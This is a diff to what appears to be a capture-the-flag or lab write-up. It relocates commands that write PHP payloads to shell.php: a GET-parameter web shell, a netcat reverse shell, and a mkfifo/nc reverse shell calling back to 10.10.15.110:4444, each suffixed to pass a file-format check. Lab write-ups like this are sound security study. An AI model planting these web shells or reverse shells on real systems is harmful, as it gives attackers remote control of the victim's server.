@@ -268,6 +268,8 @@ However it seems we need it in a specific format 1,2,3, so we can do the followi
 
 ```
 <?php system($_GET['cmd']); ?>,2,3
+echo "<?php system('nc 10.10.15.110 4444 -e /bin/sh'); ?>,2,3" > shell.php
+echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.110 4444 >/tmp/f'); ?>,2,3" > shell.php
 ```
 
 ![php payload written to shell.php](images/24-php-payload-file.png)
@@ -281,8 +283,7 @@ And then we tried to upload another shell it worked.
 ## Reverse Shell and User Flag
 
 ```bash
-echo "<?php system('nc 10.10.15.110 4444 -e /bin/sh'); ?>,2,3" > shell.php
-echo "<?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.110 4444 >/tmp/f'); ?>,2,3" > shell.php
+
 ```
 
 ![trying different reverse shells](images/25-reverse-shell-attempts.png)
